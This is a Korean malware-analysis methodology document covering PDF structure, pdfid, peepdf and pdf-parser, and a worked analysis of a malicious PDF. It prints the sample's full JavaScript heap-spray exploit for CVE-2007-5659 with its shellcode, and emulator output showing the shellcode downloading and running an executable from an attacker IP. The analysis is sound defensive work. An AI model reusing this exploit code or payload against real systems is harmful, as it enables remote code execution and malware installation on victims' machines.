# 윈도우 문서형 악성코드 분석 방법론
##### 작성자 : 김평일 대리, 정한울 대리, 김태현 사원, 강하늘 사원
##### 작성일자 : 2024년 6월 1일
</br></br>


##  PDF 파일 개요

### 1. PDF 파일 구조

PDF의 구조는 다음과 같이 구성되어 있음. 시그니처 및 버전을 나타내는 Header와 PDF문서의 내용이 들어가 있는 Body, 객체들이 참조할 때 사용되는 정보가 있는 Xref Table, 그리고 파일 구조를 추적할 수 있는 File Trailer가 존재함.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/abea70d1-088c-4461-bd8d-efee550e11a3)
<br>
<br>

##  PDF 파일 분석 도구
### 1. pdfid

pdfid는 pdfid.py 형태로 존재하며, PDF의 악성 여부를 신속히 식별하기 위해 특정 키워드를 찾는 "키워드 검색 도구"임. 이를 통해 PDF파일 내에 자바스크립트 랙션, 삽입된 파일 등 잠재적으로 위험한 요소가 있는지 검사할 수 있음.

다운로드 링크 : https://pypi.org/project/pdfid/ , 혹은 `pip install pdfid`, 혹은 `sudo apt install pdfid`

악성 키워드는 다음과 같음.

- /OpenAction, /AA : 문서를 열 때 액션을 트리거
- /JavaScript, /JS, /AcroForm, /XFA : 자바스크립트 코드 지정 및 실행
- /URL : 외부 URL 접근
- /SubmitForm, /GoToR : 외부 URL로 데이터 전송
- /RichMedia : 문서에 플래시 삽입
- /ObjStm : 객체 스트림에 데이터 숨김
- /XObject : 피싱 이미지 삽입
- /EmbeddedFile : 스트림에 외부 파일 삽입
- /Filter : 인코딩됨

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/44c3bef6-165e-434f-897f-520ed006c99f)

상기 언급한 키워드를 발견했을 경우, 해당 키워드에 대한 객체 ID룰 찾고 그 내용을 덤프하여 세부 내용을 조사해야함.

### 2. peepdf

peepdf는 PDF파일을 심층 분석할 수 있도록 설계된 포렌식 도구임. PDF 문서의 객체와 스트림(키워드)를 상세히 탐색하고 악성 요소를 식별할 수 있도록 함.

다운로드 링크 : https://pypi.org/project/peepdf/0.3.2/, 혹은 `pip install peepdf==0.3.2`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6c09adcc-79c2-4ee4-a8b5-d07afa753a91)

실행하면 다음과 같이 PDF에 대한 메타데이터를 확인할 수 있음. 가장 중요한 부분은 악성 스트림에 대한 오브젝트 넘버를 확인할 수 있는 부분임.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/34254108-aa8b-4d6f-acad-ac87ea1d35e0)

탐지한 악성 스트림에 대한 오브젝트를 살펴 보면 다음과 같이 악성 행위를 탐지할 수 있음.

### 3. pdf-parser

pdf-parser는 PDF 문서에서 데이터를 식별하고 추출하며 덤프할 수 있는 도구임. pdfid와 peepdf로 의심스러운 객체 ID가 식별되면, pdf-parser를 사용하여 의심스러운 객체 콘텐츠를 덤프할 수 있음.

다운로드 링크 : https://pypi.org/project/py-pdf-parser/, 혹은 `pip install py-pdf-parser`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/f792f868-bd5a-43d8-88ec-0094f7fd50de)

`pdf-parser.py -o 50 --raw -f <파일 이름>`

다음과 같이 객체 50에 대한 세부 정보가 표시됨. 추가로, 해당 객체를 txt 형식으로 다음과 같이 덤프할 수 있음.

`pdf-parser.py -o 50 --raw -f 파일 이름 > result.txt`

<br>

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e3df216d-2dae-48ae-a5c6-335e6786a306)

### 4. REMnux

REMnux는 리버스 엔지니어링 및 악성코드 분석 시 필요한 도구와 툴킷들이 포함되어 있는 리눅스 기반 배포판임. 위에서 언급한 도구들이 기본적으로 탑재되어 있어, 별도의 설치 필요없이 분석 환경을 구성할 수 있음. 악성코드는 기본적으로 가상환경에서 분석을 진행해야 하므로 REMnux에서 분석을 진행할 것을 권장함.

다운로드 링크 : https://remnux.org/

<br>
<br>

##  PDF 악성코드 샘플 분석
위에서 설명한 도구를 이용하여 샘플을 분석하는 프로세스를 설명함. 해당 샘플은 URL 기반 조사임.

### 1. pdfid를 이용한 의심스러운 객체 식별

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/61167d9a-f3b8-44bc-930e-4b607b426585)

pdfid로 악성 PDF를 조사한 결과, /URL에 대한 키워드가 26개 발견됨. /URL 키워드는 외부 URL 접근을 의미하므로 악성 행위가 의심됨.

### 2. peepdf를 이용한 /URL 객체 ID 식별

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/9d7925c9-38bd-4ec9-ac90-0e64424788fc)

peepdf를 이용하여 /URL의 객체 ID를 식별함. 여기서는 10,17,18,19,20,21,22,23,24,25,26,27,28에 해당하는 것을 알 수 있음.

### 3. pdf-parser를 이용한 URL 특정하기

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/90c040ec-3140-4ad7-81fa-db3a811a0230)

pdf-parser를 이용하여 /URL 객체 ID에 대한 데이터를 추출할 수 있음.

`pdf-parser.py -o 10,17,18,19,20,21,22,23,24,25,26,27,28 <파일 이름>`

다음과 같이 URL이 확인됨을 알 수 있고, virustotal 또는 기타 분석 도구를 사용하여 악성 여부를 판단할 수 있음.
<br>
<br>

##  PDF 악성코드 상세 분석
bad.pdf에 대한 상세 분석 프로세스임

`파일 정보`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/bee18d0f-d2b6-4c44-8b5d-075800aa2d64)

### 1. PDF 내부 의심스러운 키워드 찾기

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/99f8a79f-85af-4e93-8bf2-f28eb2d400a3)

pdfid를 이용하여 의심스러운 키워드를 찾으면 다음과 같음. 의심스러운 키워드로는 /JS가 2개, /JavaScript가 3개, /OpenAction이 1개 존재함.
즉, bad.pdf 파일에는 자바스크립트가 존재하고, 해당 PDF 문서를 열어봄과 동시에 무엇인가 행위를 트리거하도록 구성되어 있음을 파악할 수 있음.

### 2. PDF 파일 내 객체 ID 분석

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5e52e10b-2e3d-470f-a6a3-7dfc452c30f4)

`$ pdf-parser.py --search /OpenAction bad.pdf`

PDF 문서를 열면 가장 먼저 /OpenAction 키워드에 정의되어 있는 스크립트가 실행됨. 위 이미지와 같이 this.zfnvkWYOKv() 함수가 실행됨을 알 수 있으나 자세한 스크립트는 확인이 불가능함. 이를 확인하기 위해서는 obj 1이 참조하고 있는 obj 2, 3, 4, 5, 6, 7을 확인해야함.

Referencing : 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R, 7 0 R을 통해 참조 여부를 확인할 수 있음

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/f8e76f94-d7e1-48f8-8dc9-83a4f140ebe4)

`$ pdf-parser.py --search /JavaScript badpdf.pdf`

obj 1에서 실행되는 스크립트가 자바스크립트임을 확인했기 때문에 /JavaScript 키워드를 기반으로 검색함. 검색 결과 obj 7도 obj 10을 참조할 수 있음을 알 수 있고, obj 12에서도 /JavaScript 키워드가 발견되었으며 obj 13을 참조하고 있음. 따라서 obj 10과 obj 13을 추가로 확인해볼 필요가 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/80cfd793-b225-4ce9-9cd5-84c053ed9ac4)

`$ pdf-parser.py --object 10 badpdf.pdf`
`$ pdf-parser.py --object 13 badpdf.pdf`

obj 10과 obj 13을 확인해보면 각각 obj 10은 obj 12를 참조하고 있고 obj 13은 데이터 스트림이 포함되어 있음을 확인할 수 있음. 따라서 실제 실행하는 악성 스크립트는 obj 13에 포함된 스트림을 분석하면 알 수 있음.

### 3. PDF 구조

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/2db12b84-950b-4515-bf0c-2015b0c694df)

해당 PDF 악성코드는 위와 같은 순서로 참조하여 스크립트를 실행함. 제일 먼저 PDF 문서를 열면 obj 1에서부터 시작해서 obj 13까지 참조하여 스크립트를 실행함.

### 4. 자바스크립트 분석

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/59d6f735-1727-445c-9438-7a638194251a)

`$ pdf-parser.py --object 13 --raw --filter badpdf.pdf`

obj 13을 보면 obj 1에서 확인했던 zfnvkWYOKv() 함수의 실제 스트림이 포함되어 있으며 FlateDecode 방식으로 인코딩되어 있음을 확인할 수 있음. pdf-parser에서 --filter 옵션을 사용하면 FlatDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode, RunLengthDecode까지 디코딩이 가능함. 따라서 --raw --filter 옵션을 붙여주어 obj 13에 포함된 zfnvkWYOKv() 함수를 확인할 수 있음.

```javascript
function zfnvkWYOKv()
{
        gwKPaJSHReD0hTAD51qao1s = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");

        tuVglXABgYUAQFEYVPi3lf = unescape("%u9090%u9090"); nDsGdY1TdZUDCCpNeYRdk28BeZ5R = 20 + gwKPaJSHReD0hTAD51qao1s.length
        while (tuVglXABgYUAQFEYVPi3lf.length < nDsGdY1TdZUDCCpNeYRdk28BeZ5R) tuVglXABgYUAQFEYVPi3lf += tuVglXABgYUAQFEYVPi3lf;
        vmRV3x9BCtZs = tuVglXABgYUAQFEYVPi3lf.substring(0, nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
        dVghsR4KOJoE6WzWkTW0vz = tuVglXABgYUAQFEYVPi3lf.substring(0, tuVglXABgYUAQFEYVPi3lf.length-nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
        while(dVghsR4KOJoE6WzWkTW0vz.length + nDsGdY1TdZUDCCpNeYRdk28BeZ5R < 0x40000) dVghsR4KOJoE6WzWkTW0vz = dVghsR4KOJoE6WzWkTW0vz + dVghsR4KOJoE6WzWkTW0vz + vmRV3x9BCtZs;

        dddA9SvmIp7bFVTvbRcRoFQ = new Array();

        for ( i = 0; i < 2020; i++ ) dddA9SvmIp7bFVTvbRcRoFQ[i] = dVghsR4KOJoE6WzWkTW0vz + gwKPaJSHReD0hTAD51qao1s;

        function rHjX2qS2YpWWuvNjX9JfKZ3F(qlrSKFKRQUuUXlV0ES9I6oz4pM, oq7g9J0RSV3FcMgr9DLvvDY8ee)
        {
                var lTZGviUaML2vE40mHbYk = "";

                while (--qlrSKFKRQUuUXlV0ES9I6oz4pM >= 0) lTZGviUaML2vE40mHbYk += oq7g9J0RSV3FcMgr9DLvvDY8ee;
                return lTZGviUaML2vE40mHbYk;
        }

        Collab.collectEmailInfo({msg:rHjX2qS2YpWWuvNjX9JfKZ3F(4096, unescape("%u0909%u0909"))});
}
```


obj 13에 포함되어 있는 자바스크립트는 위와 같이 난독화가 되어있음. 우선 제일 첫 번째 변수 gwKPaJSHReD0hTAD51qao1s를 보면 hex값이 존재하는 것을 볼 수 있는데 이 공격코드의 핵심으로 유추됨. 해당 자바스크립트의 난독화를 해제해서 해석을 하면 다음과 같음.


```function zfnvkWYOKv()
{
        shellcode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");
        nop = unescape("%u9090%u9090");
        //shellcode.length = 245
        nop_length = 20 + shellcode.length;
        while (nop.length < nop_length) nop += nop;		//nop.length = 512
        dummy1 = nop.substring(0, nop_length);
        final_dummy = nop.substring(0, nop.length-nop_length);
        while(final_dummy.length + nop_length < 0x40000) final_dummy = final_dummy + final_dummy + dummy1;

        payload = new Array();

        for ( i = 0; i < 2020; i++ ) payload[i] = final_dummy + shellcode;

        function overflow(loop, ascii_0x9)
        {
                var payload2 = "";

                while (--loop >= 0) payload2 += ascii_0x9;
                return payload2;
        }

        Collab.collectEmailInfo({msg:overflow(4096, unescape("%u0909%u0909"))});}
```

난독화된 자바스크립트는 변수 및 함수명만 난독화가 되어 있고, 난독화된 자바스크립트를 해석하면 위와 같음.

- 261,879개의 NOP(0x90) 뒤에 쉘코드를 붙여서 NOP Sled 공격 코드 구성
- NOP Sled 공격코드를 2020개를 구성하여 페이로드 구성
- Collab.collectEmailInfo() 함수의 취약점(CVE-2007-5659)을 이용하여 Heap Spray 공격을 수행하고, 공격 시 Heap 영역에 할당한 쉘코드를 실행

결과적으로 해당 악성 자바스크립트는 CVE-2007-5659 취약점을 사용해서 쉘코드를 실행하도록 구성되어 있음.

### 5. 쉘코드 분석
`
$ cat shellcode_unicode 
%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036
`
<br><br>
다음 쉘코드를 분석하기 위해 exe파일로 변환하여 분석하는 방법을 사용함. 자바스크립트에서 핵심이 되는 쉘코드를 추출하여 shell_unicode에 저장함.

```shell
cat shellcode_unicode | unicode2raw > shellcode.raw
cat shellcode.raw | sctest -Svs 10000000 > sctest-out.txt
more sctest-out.txt
verbose = 1
Hook me Captain Cook!
userhooks.c:132 user_hook_ExitThread
ExitThread(-1)
stepcount 314321
HMODULE LoadLibraryA (
     LPCTSTR lpFileName = 0x00417193 => 
           = "URLMON";
) = 0x7df20000;
UINT GetSystemDirectory (
     LPTSTR lpBuffer = 0x00416c1e => 
           = "c:\WINDOWS\system32";
     UINT uSize = 255;
) =  19;
ERROR  DeleteFile (
     LPCTSTR lpFileName = 0x00416c1e => 
         none;
) =  -1;
HRESULT URLDownloadToFile (
     LPUNKNOWN pCaller = 0x00000000 => 
         none;
     LPCTSTR szURL = 0x0041719a => 
           = "http://78.109.30.5/count/005AD56F/load.php?pdf=a684eceee76fc522773286a895bc8436";
     LPCTSTR szFileName = 0x00416c1e => 
           = "c:\WINDOWS\system32\~.exe";
     DWORD dwReserved = 0;
     LPBINDSTATUSCALLBACK lpfnCB = 0;
) =  0;
UINT WINAPI WinExec (
     LPCSTR lpCmdLine = 0x00416c1e => 
           = "c:\WINDOWS\system32\~.exe";
     UINT uCmdShow = 0;
) =  32;
void ExitThread (
     DWORD dwExitCode = -1;
) =  0;
```


쉘코드를 sctest 에뮬레이터에서 실행할 경우 전반적인 악성 행위를 확인할 수 있음. 따라서 unicode로 되어 있는 쉘코드를 raw데이터로 변환한 뒤 sctest 에뮬레이터에서 실행함.
- LoadLibrary() 함수를 이용해서 urlmon.dll 로드
- GetSystemDirectory() 함수로 system32 경로 획득
- 기존에 악성코드가 존재할 경우 DeleteFile() 함수로 악성코드 제거
- urlmon.dll에 있는 URLDownloadToFile() 함수로 공격자 서버에서 system32 경로에 ~.exe의 이름으로 악성코드 다운로드
- WinExec() 함수로 다운받은 악성코드 실행
- 쉘코드 종료

### 6. 정리

badpdf.pdf는 CVE-2007-5659 취약점을 이용하여 공격하는 다운로더형 악성코드로, 파일 실행 시 내부에 있는 악성 자바스크립트가 실행되며 악성 자바스크립트에는 사용자가 Adobe Reader와 Acrobat 8.1.1 및 그 이전 버전을 사용하는 경우 Heap spray 기법을 사용하여 쉘코드를 실행함.

쉘코드가 실행되면 "http[:]//78[.]109[.]30[.]5/count/005AD56F/load[.]php?pdf=a684eceee76fc522773286a895bc8436"에서 추가로 악성코드를 다운받도록 구성되어 있음.

